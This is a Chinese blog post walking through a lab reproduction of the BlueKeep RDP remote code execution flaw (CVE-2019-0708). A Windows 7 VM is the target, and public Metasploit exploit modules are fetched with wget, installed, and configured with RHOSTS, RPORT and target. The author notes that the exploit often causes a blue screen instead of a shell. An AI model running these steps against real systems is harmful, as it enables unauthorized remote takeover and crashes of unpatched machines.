# CVE-2019-0708 远程桌面代码执行漏洞复现 - ctrl_TT 豆 - 博客园

> 原文：[`www.cnblogs.com/-chenxs/p/11491900.html`](https://www.cnblogs.com/-chenxs/p/11491900.html)

# 0x01

首先是靶机，这里的靶机是使用清水表哥提供的 win7sp1 的系统

> 漏洞环境
> 使用 VM 安装 Windows7 SP1 模拟受害机
> Windows7 SP1 下载链接:
> *`ed2k://|file|cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso|3420557312|B58548681854236C7939003B583A8078|/`*

如果用上面的系统，vm 虚拟机安装的时候默认是家庭版的，所以在安装的时候要选择一下。
![blob](img/ddf2b87d487b07909da159bc069fc088.png)

安装好如下：

![blob](img/f830192ea076b5fa89afb43d0b2db597.png)

0708 漏洞利用方式是通过远程桌面端口 3389，RDP 协议进行攻击的。所以 3389 端口当然要打开啦。

![blob](img/b66b9f34ad599ea6ca50013037fa514f.png)

靶机工作完成。

* * *

# 0x02

攻击机我这里用的是 kali 里面的 msf，而且 msf 我以前有卸载了重新安装过。
所以我先看看我 msf 安装的路径在哪里。

`find / -name 'metasploit'`

![blob](img/47a663d1323353b9e5cd2c1f6d0f412a.png)

我的路径是安装在/opt 目录下。

首先，我们需要下载好攻击套件放置文件到 msf 的相应文件夹(如果已存在同名文件,直接覆盖即可)

`wget https://raw.githubusercontent.com/rapid7/metasploit-framework/edb7e20221e2088497d1f61132db3a56f81b8ce9/lib/msf/core/exploit/rdp.rb`

`wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/rdp_scanner.rb`

`wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb`

`wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb`

![blob](img/88e5d68d22f3f5420ec6c9ee221652c2.png)

下载下来后，直接复制到对应的路径。

`cp rdp.rb /opt/metasploit-framework/embedded/framework/lib/msf/core/exploit/`

`cp rdp_scanner.rb /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/`

*如果这里没有 rdp 目录，就用 mkdir 命令创建一个 rdp 目录*
`cp cve_2019_0708_bluekeep_rce.rb /opt/metasploit-framework/embedded/framework/modules/exploits/rdp/`

`cp cve_2019_0708_bluekeep.rb /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/`

![blob](img/a33fdb5ad8627c63f891ea81ed067aca.png)

这时启动 msf。

![blob](img/88eeacaceecd03035695ed6586440357.png)

更新一下 msf

![blob](img/3dc5f3f2596171a79c59a8b408115c7d.png)

更新以后使用 reload_all 重新加载 0708rdp 利用模块

![blob](img/e7aea722af5a89b6b00e237156f07fbc.png)

`use exploit/rdp/cve_2019_0708_bluekeep_rce`

![blob](img/510f089d881035b6fef2a53abf454555.png)

主要设置的参数有 RHOSTS / RPORT / target
* RHOSTS 靶机 ip
* RPORT rdp 端口
* target ID 数字(可选为 0-4)设置受害机机器架构

# 0x03

攻击成功如下图

![blob](img/77f14ace380a5d028432f61708eef791.png)

但这是要看运气的，十次里面可能有一两次才会反弹 shell，大部分只会造成蓝屏。

参考连接：[`www.nmd5.com/?p=409`](http://www.nmd5.com/?p=409)